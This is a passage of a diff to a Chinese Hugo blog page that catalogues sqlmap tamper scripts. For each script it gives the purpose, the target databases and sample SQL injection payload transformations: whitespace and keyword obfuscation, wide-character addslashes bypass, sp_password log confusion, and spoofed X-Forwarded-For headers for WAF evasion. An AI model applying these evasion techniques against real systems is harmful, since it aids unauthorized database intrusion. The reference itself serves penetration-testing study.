-</span></span><span class="line"><span class="cl">举例：SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers
+</span></span><span class="line"><span class="cl"><span class="n">space2randomblank</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用随机的空白符替换</span> <span class="n">payload</span> <span class="err">中的空格</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="p">,</span> <span class="mf">8.4</span><span class="p">,</span> <span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">SELECT</span> <span class="n">id</span> <span class="n">FROM</span> <span class="n">users</span> <span class="o">==&gt;</span> <span class="n">SELECT</span><span class="o">%</span><span class="mi">0</span><span class="n">Did</span><span class="o">%</span><span class="mi">0</span><span class="n">DFROM</span><span class="o">%</span><span class="mi">0</span><span class="n">Ausers</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">sp_password.py
-</span></span><span class="line"><span class="cl">功能：在 payload 语句后添加 sp_password ，用于迷惑数据库日志（Space ==&gt; sp_password）
-</span></span><span class="line"><span class="cl">平台：Mssql
-</span></span><span class="line"><span class="cl">举例：1 AND 9227=9227–  ==&gt; 1 AND 9227=9227 – sp_password
+</span></span><span class="line"><span class="cl"><span class="n">sp_password</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：在</span> <span class="n">payload</span> <span class="err">语句后添加</span> <span class="n">sp_password</span> <span class="err">，用于迷惑数据库日志（</span><span class="n">Space</span> <span class="o">==&gt;</span> <span class="n">sp_password</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">AND</span> <span class="mi">9227</span><span class="o">=</span><span class="mi">9227</span><span class="err">–</span>  <span class="o">==&gt;</span> <span class="mi">1</span> <span class="n">AND</span> <span class="mi">9227</span><span class="o">=</span><span class="mi">9227</span> <span class="err">–</span> <span class="n">sp_password</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">symboliclogical.py
-</span></span><span class="line"><span class="cl">功能：用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：
-</span></span><span class="line"><span class="cl">1 and 1=1 ==&gt; 1 %26%26 1=1
-</span></span><span class="line"><span class="cl">1 or 1=1 ==&gt; 1 %7c%7c 1=1
+</span></span><span class="line"><span class="cl"><span class="n">symboliclogical</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="o">&amp;&amp;</span> <span class="err">替换</span> <span class="ow">and</span> <span class="err">，用</span> <span class="o">||</span> <span class="err">替换</span> <span class="ow">or</span> <span class="err">，用于这些关键字被过滤的情况</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="ow">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="o">%</span><span class="mi">26</span><span class="o">%</span><span class="mi">26</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="ow">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span> <span class="o">%</span><span class="mi">7</span><span class="n">c</span><span class="o">%</span><span class="mi">7</span><span class="n">c</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">unionalltounion.py
-</span></span><span class="line"><span class="cl">功能：用 union select 替换 union all select
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：union all select 1,2–+ ==&gt; union select 1,2–+
+</span></span><span class="line"><span class="cl"><span class="n">unionalltounion</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用</span> <span class="n">union</span> <span class="n">select</span> <span class="err">替换</span> <span class="n">union</span> <span class="n">all</span> <span class="n">select</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">union</span> <span class="n">all</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span> <span class="o">==&gt;</span> <span class="n">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">–</span><span class="o">+</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">unmagicquotes.py
-</span></span><span class="line"><span class="cl">功能：用宽字符绕过 GPC addslashes
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：1’ and 1=1 ==&gt; 1% df%27 and 1=1–
+</span></span><span class="line"><span class="cl"><span class="n">unmagicquotes</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：用宽字符绕过</span> <span class="n">GPC</span> <span class="n">addslashes</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span><span class="err">’</span> <span class="ow">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">==&gt;</span> <span class="mi">1</span><span class="o">%</span> <span class="n">df</span><span class="o">%</span><span class="mi">27</span> <span class="ow">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="err">–</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">uppercase.py
-</span></span><span class="line"><span class="cl">功能：将 payload 中的小写字母转为大写格式
-</span></span><span class="line"><span class="cl">平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
-</span></span><span class="line"><span class="cl">举例：insert ==&gt; INSERT
+</span></span><span class="line"><span class="cl"><span class="n">uppercase</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：将</span> <span class="n">payload</span> <span class="err">中的小写字母转为大写格式</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">Mssql</span> <span class="mi">2005</span><span class="err">、</span><span class="n">MySQL</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">5.0</span> <span class="ow">and</span> <span class="mf">5.5</span><span class="err">、</span><span class="n">Oracle</span> <span class="mi">10</span><span class="n">g</span><span class="err">、</span><span class="n">PostgreSQL</span> <span class="mf">8.3</span><span class="p">,</span> <span class="mf">8.4</span><span class="p">,</span> <span class="mf">9.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">insert</span> <span class="o">==&gt;</span> <span class="n">INSERT</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">varnish.py
-</span></span><span class="line"><span class="cl">功能：添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF
-</span></span><span class="line"><span class="cl">平台：headers = kwargs.get (“headers”, {}) headers [“X-originating-IP”] = “127.0.0.1”return payload
-</span></span><span class="line"><span class="cl">举例：All
+</span></span><span class="line"><span class="cl"><span class="n">varnish</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：添加一个</span> <span class="n">HTTP</span> <span class="err">头</span> <span class="err">“</span><span class="n">X</span><span class="o">-</span><span class="n">originating</span><span class="o">-</span><span class="ne">IP</span><span class="err">”</span> <span class="err">来绕过</span> <span class="n">WAF</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">headers</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="err">“</span><span class="n">headers</span><span class="err">”</span><span class="p">,</span> <span class="p">{})</span> <span class="n">headers</span> <span class="p">[</span><span class="err">“</span><span class="n">X</span><span class="o">-</span><span class="n">originating</span><span class="o">-</span><span class="ne">IP</span><span class="err">”</span><span class="p">]</span> <span class="o">=</span> <span class="err">“</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="err">”</span><span class="k">return</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">All</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">versionedkeywords.py
-</span></span><span class="line"><span class="cl">功能：对非函数的关键字进行注释
-</span></span><span class="line"><span class="cl">平台：MySQL 4.0.18, 5.1.56, 5.5.11
-</span></span><span class="line"><span class="cl">举例：1 union select user () ==&gt; 1/!UNION//!SELECT/user ()
+</span></span><span class="line"><span class="cl"><span class="n">versionedkeywords</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：对非函数的关键字进行注释</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mf">4.0</span><span class="o">.</span><span class="mi">18</span><span class="p">,</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">56</span><span class="p">,</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">11</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="n">user</span> <span class="p">()</span> <span class="o">==&gt;</span> <span class="mi">1</span><span class="o">/!</span><span class="n">UNION</span><span class="o">//!</span><span class="n">SELECT</span><span class="o">/</span><span class="n">user</span> <span class="p">()</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">versionedmorekeywords.py
-</span></span><span class="line"><span class="cl">功能：对每个关键字进行注释处理
-</span></span><span class="line"><span class="cl">平台：MySQL 5.1.56, 5.5.11
-</span></span><span class="line"><span class="cl">举例：1 union select user () ==&gt; 1/!UNION//!SELECT/user ()
+</span></span><span class="line"><span class="cl"><span class="n">versionedmorekeywords</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：对每个关键字进行注释处理</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">MySQL</span> <span class="mf">5.1</span><span class="o">.</span><span class="mi">56</span><span class="p">,</span> <span class="mf">5.5</span><span class="o">.</span><span class="mi">11</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="mi">1</span> <span class="n">union</span> <span class="n">select</span> <span class="n">user</span> <span class="p">()</span> <span class="o">==&gt;</span> <span class="mi">1</span><span class="o">/!</span><span class="n">UNION</span><span class="o">//!</span><span class="n">SELECT</span><span class="o">/</span><span class="n">user</span> <span class="p">()</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">xforwardedfor.py
-</span></span><span class="line"><span class="cl">功能：添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF
-</span></span><span class="line"><span class="cl">平台：All
-</span></span><span class="line"><span class="cl">举例：headers = kwargs.get (“headers”, {}) headers [“X-Forwarded-For”] = randomIP () return payload
+</span></span><span class="line"><span class="cl"><span class="n">xforwardedfor</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="err">功能：添加一个伪造的</span> <span class="n">HTTP</span> <span class="err">头</span> <span class="err">“</span><span class="n">X</span><span class="o">-</span><span class="n">Forwarded</span><span class="o">-</span><span class="n">For</span><span class="err">”</span> <span class="err">来绕过</span> <span class="n">WAF</span>
+</span></span><span class="line"><span class="cl"><span class="err">平台：</span><span class="n">All</span>
+</span></span><span class="line"><span class="cl"><span class="err">举例：</span><span class="n">headers</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="err">“</span><span class="n">headers</span><span class="err">”</span><span class="p">,</span> <span class="p">{})</span> <span class="n">headers</span> <span class="p">[</span><span class="err">“</span><span class="n">X</span><span class="o">-</span><span class="n">Forwarded</span><span class="o">-</span><span class="n">For</span><span class="err">”</span><span class="p">]</span> <span class="o">=</span> <span class="n">randomIP</span> <span class="p">()</span> <span class="k">return</span> <span class="n">payload</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="编写tamper">编写tamper</h4>
@@ -1293,7 +1294,7 @@ sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。</p
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kali/">kali</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kali/">Kali</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
         </section>
@@ -1306,8 +1307,8 @@ sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。</p
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><script src="https://cdn1.lncld.net/static/js/av-mini-0.6.10.js"></script><script src="http://jerry-cdn.b0.upaiyun.com/hit-kounter/hit-kounter-lc-0.2.0.js"></script><span data-hk-page="current"> - </span></div><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/hubu8" target="_blank">Eccentric</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><script src="https://cdn1.lncld.net/static/js/av-mini-0.6.10.js"></script><script src="http://jerry-cdn.b0.upaiyun.com/hit-kounter/hit-kounter-lc-0.2.0.js"></script><span data-hk-page="current"> - </span></div><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.147.7">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
@@ -1316,5 +1317,5 @@ sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。</p
             </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"rTeTnudkYwu3cz5ejsdiKdFm-gzGzoHsz","appKey":"SfE7A8tmPKu2F6Pf5LMUewa4","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","meta":["nick","mail"],"pageSize":10,"placeholder":"在这里留下足迹吧!","recordIP":true,"visitor":true}},"search":{"algoliaAppID":"CT9HNMDY0J","algoliaIndex":"hugo","algoliaSearchKey":"e48b980a6aaab08129f8a8d9a425c47b","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"rTeTnudkYwu3cz5ejsdiKdFm-gzGzoHsz","appKey":"SfE7A8tmPKu2F6Pf5LMUewa4","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@15.1.2/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-CN","meta":["nick","mail"],"pageSize":10,"placeholder":"在这里留下足迹吧!","recordIP":true,"visitor":true}},"search":{"algoliaAppID":"CT9HNMDY0J","algoliaIndex":"hugo","algoliaSearchKey":"e48b980a6aaab08129f8a8d9a425c47b","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
